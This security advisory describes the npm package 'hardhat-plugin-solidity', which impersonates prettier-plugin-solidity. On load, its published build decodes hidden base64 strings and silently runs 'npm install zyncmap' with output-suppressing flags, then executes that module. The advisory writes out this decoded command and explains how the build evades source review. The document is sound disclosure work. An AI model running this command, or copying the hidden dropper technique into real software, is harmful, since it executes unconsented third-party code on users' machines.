summary: hardhat-plugin-solidity impersonates prettier-plugin-solidity and drops remote npm package on load
details: The published `dist/index.js` contains base64-encoded literals that decode to the shell command `npm install zyncmap --no-save --silent --no-audit --no-fund` and the module name `zyncmap`. On `require()` of the package's main entry, the bundle spawns the hidden `npm install` of `zyncmap`, then `require()`s that newly installed module and invokes `getPlugin()()`, executing third-party code on the installer with no consent. The corresponding `src/index.ts` contains none of this logic — the dropper exists only in the published build, indicating deliberate evasion of source review. The package metadata (description, repository `prettier-solidity/prettier-plugin-solidity`, keywords, author list) is copied verbatim from the legitimate `prettier-plugin-solidity`, while the name borrows the `hardhat-plugin-*` Ethereum-tooling namespace to broaden the lure. Runtime dependencies include `axios` and the deprecated `request`, neither used by the legitimate upstream, plausibly staging additional capability for the dropped payload.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
